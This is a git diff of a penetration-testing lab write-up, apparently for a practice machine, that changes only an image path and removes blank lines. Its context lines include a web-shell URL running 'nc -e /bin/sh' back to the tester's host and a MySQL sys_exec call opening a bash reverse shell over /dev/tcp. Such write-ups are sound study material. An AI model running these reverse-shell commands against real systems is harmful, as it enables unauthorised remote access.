@@ -175,7 +175,7 @@ http://192.168.78.56:8295/backdoor.php?cmd=nc -e /bin/sh 192.168.49.78 8295
 
 ## Foothold Proof
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Upon going back a directory, we find config.php
 
@@ -264,25 +264,4 @@ select sys\_exec('bash -c "bash -i >& /dev/tcp/192.168.49.78/8080 0>&1"');
 * <mark style="color:yellow;">VSFTPD 3.0.3</mark>
 * <mark style="color:yellow;">PostGreSQL 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17</mark>
 
-
-
 ## This remains unfinished due to the weird privilege escalation with mysql. I kept getting a strange error after numerous attempts. Moving on.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
